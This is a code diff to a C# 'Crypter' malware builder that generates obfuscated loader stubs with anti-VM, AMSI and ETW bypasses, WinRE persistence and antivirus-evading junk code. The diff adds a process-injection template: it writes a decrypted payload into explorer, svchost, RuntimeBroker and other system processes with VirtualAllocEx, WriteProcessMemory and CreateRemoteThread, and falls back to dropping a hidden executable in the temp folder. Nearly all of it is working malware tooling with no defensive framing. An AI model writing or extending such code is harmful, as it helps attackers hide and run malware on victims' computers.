@@ -78,7 +78,8 @@ namespace Crypter.Forms
                 useArmdot = armdotObfuscation.Checked,
                 processMasquerading = processMasquerading.Checked,
                 useEvilbyteIndirectSyscalls = evilbyteIndirectSyscalls.Checked,
-                winREPersistence = winREPersistence.Checked
+                winREPersistence = winREPersistence.Checked,
+                useMemoryInjection = memoryInjection.Checked
             };
             return obj;
         }
@@ -97,6 +98,7 @@ namespace Crypter.Forms
             processMasquerading.Checked = obj.processMasquerading;
             evilbyteIndirectSyscalls.Checked = obj.useEvilbyteIndirectSyscalls;
             winREPersistence.Checked = obj.winREPersistence;
+            memoryInjection.Checked = obj.useMemoryInjection;
         }
 
         static string antiVMTemplate()
@@ -1247,7 +1249,7 @@ private static void CreateRunOnceEntry(string exePath)
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
 
-        static string PublicStubTemplate(bool useAntiVM, bool useAntiDebug, bool useAmsiBypass, bool useEtwBypass, bool useRunAs, bool useStartup, bool useProcessMasquerading, bool useWinREPersistence)
+        static string PublicStubTemplate(bool useAntiVM, bool useAntiDebug, bool useAmsiBypass, bool useEtwBypass, bool useRunAs, bool useStartup, bool useProcessMasquerading, bool useWinREPersistence, bool useMemoryInjection)
         {
             string injectedMethods = "";
             string mainBody = "";
@@ -1307,6 +1309,11 @@ private static void CreateRunOnceEntry(string exePath)
             {
                 injectedMethods += winREPersistenceTemplate() + "\n";
                 mainBody += "            SetupWinREPersistence();\n";
+            }
+
+            if (useMemoryInjection)
+            {
+                injectedMethods += memoryInjectionTemplate() + "\n";
             }
 
             // Add polymorphic code to break AV signatures
@@ -1684,7 +1691,8 @@ namespace {namespaceName}
                 runas.Checked,
                 startup.Checked,
                 processMasquerading.Checked,
-                winREPersistence.Checked
+                winREPersistence.Checked,
+                memoryInjection.Checked
             );
 
                 string execPayload;
@@ -1695,6 +1703,7 @@ namespace {namespaceName}
         // Apply junk data operations to confuse AV heuristics
         System.Threading.Thread.Sleep(1);
         " + GenerateJunkCodeSnippet() + @"
+        
         
         // Decrypt payload with polymorphic behavior
         byte[] key = Convert.FromBase64String(@""" + keyString + @""");
@@ -1724,8 +1733,31 @@ namespace {namespaceName}
         ";
                 }
                 
-                // Add the rest of the execution payload (file writing and process creation)
-                execPayload += @"
+                // Add the execution payload based on memory injection setting
+                if (memoryInjection.Checked)
+                {
+                    execPayload += @"
+        // Use memory injection to execute the payload
+        if (!InjectShellcode(exebytes))
+        {
+            // Fallback to direct execution if injection fails
+            string tmppath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".exe"");
+            File.WriteAllBytes(tmppath, exebytes);
+            
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = tmppath,
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden
+            };
+            
+            Process.Start(startInfo);
+        }";
+                }
+                else
+                {
+                    execPayload += @"
         string tmppath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".exe"");
         File.WriteAllBytes(tmppath, exebytes);
         
@@ -1771,6 +1803,7 @@ namespace {namespaceName}
         // Start the process
         Process process = new Process { StartInfo = startInfo };
         process.Start();";
+                }
 
                 stub = stub.Replace("string encryptedexe = \"TEMP\";", execPayload);
 
@@ -2425,6 +2458,137 @@ namespace {namespaceName}
             }
             
             return resultPath;
+        }
+
+        static string memoryInjectionTemplate()
+        {
+            return @"
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern IntPtr MI_OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern IntPtr MI_VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern bool MI_WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern IntPtr MI_CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern bool MI_CloseHandle(IntPtr hObject);
+
+        [DllImport(""kernel32.dll"", CharSet = CharSet.Auto)]
+        private static extern IntPtr MI_GetModuleHandle(string lpModuleName);
+
+        [DllImport(""kernel32.dll"", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        private static extern IntPtr MI_GetProcAddress(IntPtr hModule, string procName);
+
+        private const uint MI_PROCESS_CREATE_THREAD = 0x0002;
+        private const uint MI_PROCESS_QUERY_INFORMATION = 0x0400;
+        private const uint MI_PROCESS_VM_OPERATION = 0x0008;
+        private const uint MI_PROCESS_VM_WRITE = 0x0020;
+        private const uint MI_PROCESS_VM_READ = 0x0010;
+        private const uint MI_MEM_COMMIT = 0x00001000;
+        private const uint MI_MEM_RESERVE = 0x00002000;
+        private const uint MI_PAGE_READWRITE = 0x04;
+        private const uint MI_PAGE_EXECUTE_READ = 0x20;
+        private const uint MI_PAGE_EXECUTE_READWRITE = 0x40;
+
+        private static bool InjectPayload(byte[] payload, string targetProcess = ""explorer"")
+        {
+            try
+            {
+                // Find target process
+                Process[] processes = Process.GetProcessesByName(targetProcess);
+                if (processes.Length == 0)
+                    return false;
+
+                Process targetProc = processes[0];
+                
+                // Get required access rights
+                uint desiredAccess = MI_PROCESS_CREATE_THREAD | MI_PROCESS_QUERY_INFORMATION | 
+                                   MI_PROCESS_VM_OPERATION | MI_PROCESS_VM_WRITE | MI_PROCESS_VM_READ;
+
+                // Open process handle
+                IntPtr procHandle = MI_OpenProcess(desiredAccess, false, targetProc.Id);
+                if (procHandle == IntPtr.Zero)
+                    return false;
+
+                try
+                {
+                    // Allocate memory in target process
+                    IntPtr baseAddress = MI_VirtualAllocEx(procHandle, IntPtr.Zero, (uint)payload.Length,
+                                                      MI_MEM_COMMIT | MI_MEM_RESERVE, MI_PAGE_EXECUTE_READWRITE);
+                    if (baseAddress == IntPtr.Zero)
+                        return false;
+
+                    // Write payload to allocated memory
+                    UIntPtr bytesWritten;
+                    if (!MI_WriteProcessMemory(procHandle, baseAddress, payload, (uint)payload.Length, out bytesWritten))
+                        return false;
+
+                    // Create remote thread to execute payload
+                    uint threadId;
+                    IntPtr threadHandle = MI_CreateRemoteThread(procHandle, IntPtr.Zero, 0, baseAddress,
+                                                           IntPtr.Zero, 0, out threadId);
+
+                    if (threadHandle == IntPtr.Zero)
+                        return false;
+
+                    // Cleanup
+                    MI_CloseHandle(threadHandle);
+                    return true;
+                }
+                finally
+                {
+                    if (procHandle != IntPtr.Zero)
+                        MI_CloseHandle(procHandle);
+                }
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        private static bool InjectShellcode(byte[] shellcode)
+        {
+            try
+            {
+                // Get kernel32.dll module handle
+                IntPtr kernel32 = MI_GetModuleHandle(""kernel32.dll"");
+                if (kernel32 == IntPtr.Zero)
+                    return false;
+
+                // Get LoadLibraryA function address
+                IntPtr loadLibraryAddr = MI_GetProcAddress(kernel32, ""LoadLibraryA"");
+                if (loadLibraryAddr == IntPtr.Zero)
+                    return false;
+
+                // Try multiple injection targets
+                string[] targetProcesses = new string[] 
+                { 
+                    ""explorer"",
+                    ""svchost"",
+                    ""RuntimeBroker"",
+                    ""taskhostw"",
+                    ""sihost""
+                };
+
+                foreach (string procName in targetProcesses)
+                {
+                    if (InjectPayload(shellcode, procName))
+                        return true;
+                }
+
+                return false;
+            }
+            catch
+            {
+                return false;
+            }
+        }";
         }
     }
 }
